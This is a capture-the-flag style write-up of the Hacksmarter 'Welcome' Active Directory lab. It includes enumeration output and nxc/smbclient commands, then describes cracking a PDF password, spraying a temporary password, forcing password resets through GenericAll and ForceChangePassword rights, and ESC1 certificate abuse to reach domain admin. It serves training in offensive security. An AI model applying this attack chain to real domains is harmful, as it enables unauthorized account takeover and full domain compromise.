---
title: "Welcome — Hacksmarter Writeup"
description: EASY Difficulty
date: 2025-11-06 12:00:00 +0000
categories: [Writeups, Hacksmarter Labs]
tags: [Active Directory, Easy, ADCS, ESC1, PDF2John, Kerberoast]
image:
  path: /assets/welcome_img/welcome_banner.jpeg
---
# Scope

You are a member of the Hack Smarter Red Team. During a phishing engagement, you were able to retrieve credentials to enumerate the environment, elvate your privileges, and demonstrate impact for the client.

## Starting Credentials

```bash
e.hills : Il0vemyj0b2025!
```

---

# Enumeration

## Nmap Scan —

```bash
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-06 18:10:57Z)
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-06T18:12:16+00:00; -11s from scanner time.
| ssl-cert: Subject: commonName=**DC01.WELCOME.local**
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
445/tcp  open  microsoft-ds? syn-ack ttl 126
464/tcp  open  kpasswd5?     syn-ack ttl 126
593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
|_ssl-date: 2025-11-06T18:12:16+00:00; -11s from scanner time.
3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
|_ssl-date: 2025-11-06T18:12:16+00:00; -11s from scanner time.
3269/tcp open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-06T18:12:16+00:00; -11s from scanner time.
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WELCOME
|   NetBIOS_Domain_Name: WELCOME
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: WELCOME.local
|   DNS_Computer_Name: DC01.WELCOME.local
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-06T18:11:36+00:00
|_ssl-date: 2025-11-06T18:12:16+00:00; -11s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Short version:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 14:00 EST
Nmap scan report for dc01.welcome.local (10.1.210.136)
Host is up (0.039s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 4.30 seconds
```

---

# /etc/hosts

```bash
#add hostname to /etc/hosts file
10.1.210.136     dc01.welcome.local welcome.local dc01
```

## smb enumeration

To-Do List:

- [x]  anon access
- [x]  guest access
- [x]  given creds:
    - [x]  shares?
    - [x]  local auth?
        
        no luck here…
        
    - [x]  username enumeration?
    - [x]  password pol?
    - [x]  winrm?
        
        no luck here…
        

```bash
Anonymous access scan is running...
SMB         10.1.210.136    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.210.136    445    DC01             [+] WELCOME.local\:

Scan Completed.

Guest access scan is running...
SMB         10.1.210.136    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.210.136    445    DC01             [-] WELCOME.local\guest: STATUS_ACCOUNT_DISABLED
```

Guest account is disabled. We do get the green plus for potential anonymous access. lets see if we can list shares.

```bash
Test for shares? [1] Anonymous [2] guest (Leave <blank> for 'No'):: 1
SMB         10.1.210.136    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.210.136    445    DC01             [+] WELCOME.local\:
SMB         10.1.210.136    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

We can test for additional users and password policy in case we need to do any brute-forcing in the future. We can also have a list of additional users kept for later. 

**Commands Used:**

```bash
nxc smb dc01.welcome.local -u e.hills -p 'Il0vemyj0b2025!' --users
nxc smb dc01.welcome.local -u e.hills -p 'Il0vemyj0b2025!' --pass-pol
```

```bash
TARGET IP(s):: 10.1.210.136
USERNAME:: e.hills
PASSWORD:: Il0vemyj0b2025!
Starting username & password policy enumeration...

SMB         10.1.210.136    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.210.136    445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
SMB         10.1.210.136    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.1.210.136    445    DC01             **Administrator**                 2025-09-13 16:24:04 0       Built-in account for administering the computer/domain
SMB         10.1.210.136    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.1.210.136    445    DC01             krbtgt                        2025-09-13 16:40:39 0       Key Distribution Center Service Account
SMB         10.1.210.136    445    DC01             **e.hills**                       2025-09-13 20:41:15 0
SMB         10.1.210.136    445    DC01             **j.crickets**                    2025-09-13 20:43:53 0
SMB         10.1.210.136    445    DC01             **e.blanch**                      2025-09-13 20:49:13 0
SMB         10.1.210.136    445    DC01             **i.park**                        2025-09-14 04:23:03 0       IT Intern
SMB         10.1.210.136    445    DC01             **j.johnson**                     2025-09-13 20:58:15 0
SMB         10.1.210.136    445    DC01             **a.harris**                      2025-09-13 20:59:13 0
SMB         10.1.210.136    445    DC01             **svc_ca**                        2025-09-14 00:19:35 0
SMB         10.1.210.136    445    DC01             **svc_web**                       2025-09-13 21:40:40 0       **Web Server in Progress**
SMB         10.1.210.136    445    DC01             [*] Enumerated 11 local users: WELCOME
SMB         10.1.210.136    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.210.136    445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
SMB         10.1.210.136    445    DC01             [+] Dumping password info for domain: WELCOME
SMB         10.1.210.136    445    DC01             Minimum password length: 7
SMB         10.1.210.136    445    DC01             Password history length: 24
SMB         10.1.210.136    445    DC01             Maximum password age: 41 days 23 hours 53 minutes
SMB         10.1.210.136    445    DC01
SMB         10.1.210.136    445    DC01             Password Complexity Flags: 000001
SMB         10.1.210.136    445    DC01                 Domain Refuse Password Change: 0
SMB         10.1.210.136    445    DC01                 Domain Password Store Cleartext: 0
SMB         10.1.210.136    445    DC01                 Domain Password Lockout Admins: 0
SMB         10.1.210.136    445    DC01                 Domain Password No Clear Change: 0
SMB         10.1.210.136    445    DC01                 Domain Password No Anon Change: 0
SMB         10.1.210.136    445    DC01                 Domain Password Complex: 1
SMB         10.1.210.136    445    DC01
SMB         10.1.210.136    445    DC01             Minimum password age: 1 day 4 minutes
SMB         10.1.210.136    445    DC01             Reset Account Lockout Counter: 30 minutes
SMB         10.1.210.136    445    DC01             Locked Account Duration: 30 minutes
SMB         10.1.210.136    445    DC01             **Account Lockout Threshold: No**ne
SMB         10.1.210.136    445    DC01             Forced Log off Time: Not Set

User & password policy enumeration completed.
```

We find `11` users and no account lockout. There is a web service account `svc_web` and a web server in progress. 

we can pipe the users into a file:

```bash
Administrator
Guest
krbtgt
e.hills
j.crickets
e.blanch
i.park
j.johnson
a.harris
svc_ca
svc_web
```

We will keep this information for later attacks (potential as-rep, etc.)

---

## shares

```bash
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/welcome]
└─# nxc smb dc01.welcome.local -u e.hills -p 'Il0vemyj0b2025!' --shares
SMB         10.1.210.136    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.210.136    445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
SMB         10.1.210.136    445    DC01             [*] Enumerated shares
SMB         10.1.210.136    445    DC01             Share           Permissions     Remark
SMB         10.1.210.136    445    DC01             -----           -----------     ------
SMB         10.1.210.136    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.210.136    445    DC01             C$                              Default share
SMB         10.1.210.136    445    DC01             **Human Resources READ**
SMB         10.1.210.136    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.210.136    445    DC01             NETLOGON        READ            Logon server share
SMB         10.1.210.136    445    DC01             SYSVOL          READ            Logon server share
```

We find one interesting readable share : `Human Resources`

```bash
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/welcome]
└─# smbclient //dc01.welcome.local/'Human Resources' -U e.hills
Password for [WORKGROUP\e.hills]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Sep 13 19:20:17 2025
  ..                                  D        0  Sat Sep 13 16:11:19 2025
  Welcome 2025 Holiday Schedule.pdf      A    84715  Sat Sep 13 18:18:12 2025
  Welcome Benefits.pdf                A    81466  Sat Sep 13 18:18:12 2025
  Welcome Handbook Excerpts.pdf       A    82644  Sat Sep 13 18:18:12 2025
  Welcome Performance Review Guide.pdf      A    79823  Sat Sep 13 18:18:12 2025
  Welcome Start Guide.pdf             A    89511  Sat Sep 13 18:18:12 2025

	        15568127 blocks of size 4096. 12129506 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Welcome 2025 Holiday Schedule.pdf of size 84715 as Welcome 2025 Holiday Schedule.pdf (244.8 KiloBytes/sec) (average 244.8 KiloBytes/sec)
getting file \Welcome Benefits.pdf of size 81466 as Welcome Benefits.pdf (459.9 KiloBytes/sec) (average 317.6 KiloBytes/sec)
getting file \Welcome Handbook Excerpts.pdf of size 82644 as Welcome Handbook Excerpts.pdf (463.8 KiloBytes/sec) (average 354.7 KiloBytes/sec)
getting file \Welcome Performance Review Guide.pdf of size 79823 as Welcome Performance Review Guide.pdf (458.5 KiloBytes/sec) (average 375.4 KiloBytes/sec)
getting file \Welcome Start Guide.pdf of size 89511 as Welcome Start Guide.pdf (505.3 KiloBytes/sec) (average 397.2 KiloBytes/sec)
```

We find 5 pdf’s inside and I’m going to grab them all.

Upon viewing all the files, there is one that’s `password protected`

‘**Welcome Start Guide.pdf**’:

![image.png](/assets/welcome_img/image.png)

---

# `pdf2john` : PDF Password Cracked

There is a tool we can use to crack the password that is protecting the file

```bash
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/welcome]
└─# pdf2john Human\ Resources/Welcome\ Start\ Guide.pdf > hash.txt
```

And we use `john` to crack it

![image.png](/assets/welcome_img/image%201.png)

---

# New Password Discovered

Upon opening the pdf, we do come across a temporary password. 

![image.png](/assets/welcome_img/image%202.png)

Since we have a list of users already, we can try to see if any of them failed to change their passwords. 

![image.png](/assets/welcome_img/image%203.png)

It seems the user `a.harris` failed to change their password, and now we have a new set of credentials!

---

# BloodHound Analysis : Deep Dive

We now have control over `a.harris`

We find out this user has `GenericAll` over the user `i.park`

![image.png](/assets/welcome_img/image%204.png)

We can also take a look at the user `i.park` to see what outbound controls this user has.

And find out that `i.park` has `ForceChangePassword` on both service accounts: `svc_web`, `svc_ca`

![image.png](/assets/welcome_img/image%205.png)

If we gain access to the account `svc_ca`, we could potentially abuse a vulnerability on this `ca-template` we have `enroll` rights over:

![image.png](/assets/welcome_img/image%206.png)

---

# TargetedKerberoast: GenericAll (Failed)

Since the user `a.harris` has `genericAll` rights over the user `i.park` we could potentially run a `targetedkerberoast` hit.

### Attack Description (According to Bloodhound):

> The tool will automatically attempt a `targetedKerberoast` attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
> 
> 
> The recovered hash can be cracked offline using the tool of your choice.
> 

![image.png](/assets/welcome_img/image%207.png)

We’ve obtained the user `i.park`'s password hash, which we can then crack using `hashcat`

### Password is NOT crackable

Can’t crack the password, but since we have `GenericAll`, we can just force change `i.park`'s password. 

---

# Changing `i.park`'s password

We can run `net rpc` for this to work:

![image.png](/assets/welcome_img/image%208.png)

---

# Changing `svc_ca`'s password

Since we have `forceChangePassword` over `svc_ca`, we can just run the same command for the new user. 

![image.png](/assets/welcome_img/image%209.png)

We are successful.

Now, we can run some ADCS Vulnerability Scanning using `certipy-ad`

---

# Welcome-Template : ESC1 Vulnerability

![image.png](/assets/welcome_img/image%2010.png)

![image.png](/assets/welcome_img/image%2011.png)

We do find out that the template `Welcome-Template` is vulnerable to `ESC1 : Enrollee supplies subject and template allows client authentication`

which means we can have a regular user impersonate anyone on the domain (Even a domain admin)

### Vulnerability Description:

The vulnerability allows any low-level user to request a certifcate for any account — not just themselves. This would allow us to elevate to a domain admin level account if successful. 

---

# Admin Impersonation : Abusing ESC1

![image.png](/assets/welcome_img/image%2012.png)

We now have the administrator’s password hash!

We can now try accessing the machine via `evil-winrm`

![image.png](/assets/welcome_img/image%2013.png)

# We’ve PWN3D The Box!

I didn’t add this section, but the user `a.harris` does have winrm access to the machine as a low level user. You can find the `user.txt` file in their `Desktop` directory!
